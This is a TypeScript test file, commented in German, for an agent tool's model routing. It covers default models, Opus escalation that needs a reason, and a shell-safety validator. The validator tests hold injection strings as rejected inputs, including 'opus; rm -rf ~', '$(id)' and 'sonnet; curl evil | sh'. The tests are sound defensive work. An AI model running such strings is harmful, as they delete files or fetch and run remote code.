import { describe, it } from 'node:test'
import * as assert from 'node:assert/strict'
import {
  DEFAULT_SESSION_MODEL,
  DEFAULT_SUBAGENT_MODEL,
  sessionModelFor,
  subagentModelFor,
  isOpusModel,
  checkEscalation,
  buildEscalationNote,
} from '../../src/main/agent/model-routing'

// ─── Modell-Routing als Default (2026-10-24) ─────────────────
//
// Gemessen vom 25.09. bis 24.10.: 85 % der Tokens auf Opus, weil
// ~/.claude/settings.json global "opus" setzt und keine Mux-Session ein Modell
// mitgab. Subagenten (45 % der Tokens) erbten es. Seitdem gilt: eine Session
// ohne Rolle startet auf Sonnet, Subagenten ebenso, und Opus gibt es fuer eine
// andere Rolle als den Systems Engineer nur mit Begruendung.

describe('sessionModelFor', () => {
  it('ohne Eintrag gilt Sonnet', () => {
    assert.equal(sessionModelFor(undefined), DEFAULT_SESSION_MODEL)
    assert.equal(sessionModelFor({}), 'sonnet')
  })
  it('ein gesetzter Wert gewinnt', () => {
    assert.equal(sessionModelFor({ sessionModel: 'opus' }), 'opus')
  })
  it('leerer String heisst: die CLI entscheidet', () => {
    assert.equal(sessionModelFor({ sessionModel: '' }), undefined)
    assert.equal(sessionModelFor({ sessionModel: '   ' }), undefined)
  })
  it('ein handeditierter Unsinnswert faellt auf den Default', () => {
    assert.equal(sessionModelFor({ sessionModel: 42 as unknown as string }), 'sonnet')
  })
})

describe('subagentModelFor', () => {
  it('ohne Eintrag gilt Sonnet', () => {
    assert.equal(subagentModelFor(undefined), DEFAULT_SUBAGENT_MODEL)
  })
  it('leer heisst: erben wie bisher', () => {
    assert.equal(subagentModelFor({ subagentModel: '' }), undefined)
  })
  it('ein gesetzter Wert gewinnt', () => {
    assert.equal(subagentModelFor({ subagentModel: 'haiku' }), 'haiku')
  })
})

describe('isOpusModel', () => {
  it('erkennt Alias und volle IDs', () => {
    assert.equal(isOpusModel('opus'), true)
    assert.equal(isOpusModel('claude-opus-5-5'), true)
    assert.equal(isOpusModel('anthropic/claude-opus-5-5'), true)
    assert.equal(isOpusModel('opus[1m]'), true)
  })
  it('alles andere nicht', () => {
    assert.equal(isOpusModel('sonnet'), false)
    assert.equal(isOpusModel('gpt-6-astra'), false)
    assert.equal(isOpusModel(undefined), false)
  })
})

describe('checkEscalation', () => {
  it('kein Modell oder kein Opus: nichts zu pruefen', () => {
    assert.deepEqual(checkEscalation({ model: undefined }), { ok: true, escalated: false })
    assert.deepEqual(checkEscalation({ model: 'sonnet' }), { ok: true, escalated: false })
  })
  it('der Systems Engineer darf Opus ohne Grund', () => {
    assert.deepEqual(
      checkEscalation({ model: 'opus', entityId: 'systems-engineer' }),
      { ok: true, escalated: false },
    )
  })
  it('Opus fuer eine andere Rolle ohne Grund wird abgelehnt', () => {
    const r = checkEscalation({ model: 'opus', entityId: 'cyber-factory' })
    assert.equal(r.ok, false)
    if (!r.ok) assert.match(r.error, /eskalation\.grund/)
  })
  it('Opus fuer eine freie Session ohne Grund wird abgelehnt', () => {
    assert.equal(checkEscalation({ model: 'claude-opus-5-5' }).ok, false)
  })
  it('ein leerer Grund ist kein Grund', () => {
    assert.equal(checkEscalation({ model: 'opus', entityId: 'workshop', grund: '  ' }).ok, false)
  })
  it('mit Grund: erlaubt und als Eskalation markiert', () => {
    assert.deepEqual(
      checkEscalation({ model: 'opus', entityId: 'workshop', grund: 'zwei rote Gates' }),
      { ok: true, escalated: true },
    )
  })
})

describe('buildEscalationNote', () => {
  it('nennt Rolle, Modell, Grund, Aufrufer und traegt nur vergebbare Tags', () => {
    const n = buildEscalationNote({
      target: 'cyber-factory',
      model: 'opus',
      grund: 'zwei rote Gates in Welle 3',
      caller: 'systems-engineer',
      sessionName: 'CF-dms',
      now: new Date('2026-10-24T10:00:00Z'),
    })
    assert.equal(n.title, 'Eskalation: cyber-factory auf Opus — 2026-10-24')
    assert.match(n.body, /zwei rote Gates in Welle 3/)
    assert.match(n.body, /systems-engineer/)
    assert.match(n.body, /CF-dms/)
    assert.match(n.body, /Lebensdauer dieser Session/)
    assert.deepEqual(n.tags, ['kind:reference'])
  })
  it('ohne Aufrufer steht dort, dass er unbekannt ist', () => {
    const n = buildEscalationNote({ target: 'freie Session', model: 'opus', grund: 'x', now: new Date('2026-10-24T00:00:00Z') })
    assert.match(n.body, /unbekannt/)
  })
})

describe('writeZuarbeitAgents', () => {
  it('legt einen Haiku-Agenten mit nur lesenden Werkzeugen an', async () => {
    const fs = await import('fs')
    const os = await import('os')
    const path = await import('path')
    const { writeZuarbeitAgents } = await import('../../src/main/agent/model-routing')
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'zuarbeit-'))
    try {
      writeZuarbeitAgents(dir)
      const md = fs.readFileSync(path.join(dir, '.claude', 'agents', 'zuarbeit.md'), 'utf-8')
      assert.match(md, /^---\nname: zuarbeit\n/)
      assert.match(md, /\nmodel: haiku\n/)
      assert.match(md, /\ntools: Read, Grep, Glob, Bash\n/)
      assert.doesNotMatch(md, /Edit|Write/)
    } finally {
      fs.rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('isSafeModelName', () => {
  // Der Name landet in einer Zeile, die per tmux in eine Shell getippt wird.
  it('nimmt Aliase und volle IDs mit Anbieter und Variante', async () => {
    const { isSafeModelName } = await import('../../src/main/agent/model-routing')
    for (const m of ['sonnet', 'opus', 'claude-opus-5-5', 'anthropic/claude-sonnet-5-5', 'opus[1m]', 'gpt-6-astra', 'qwen3.8:27b']) {
      assert.equal(isSafeModelName(m), true, m)
    }
  })
  it('weist alles ab, was die Shell deuten wuerde', async () => {
    const { isSafeModelName } = await import('../../src/main/agent/model-routing')
    for (const m of ['opus; rm -rf ~', 'a b', '$(id)', '`id`', 'x|y', 'x&&y', "o'pus", 'x\ny', '', '-rf']) {
      assert.equal(isSafeModelName(m), false, JSON.stringify(m))
    }
  })
})

describe('checkEscalation — Modellname', () => {
  it('ein Shell-Fragment im Modell wird abgelehnt, auch ohne Opus', async () => {
    const r = checkEscalation({ model: 'sonnet; curl evil | sh', entityId: 'workshop' })
    assert.equal(r.ok, false)
  })
})
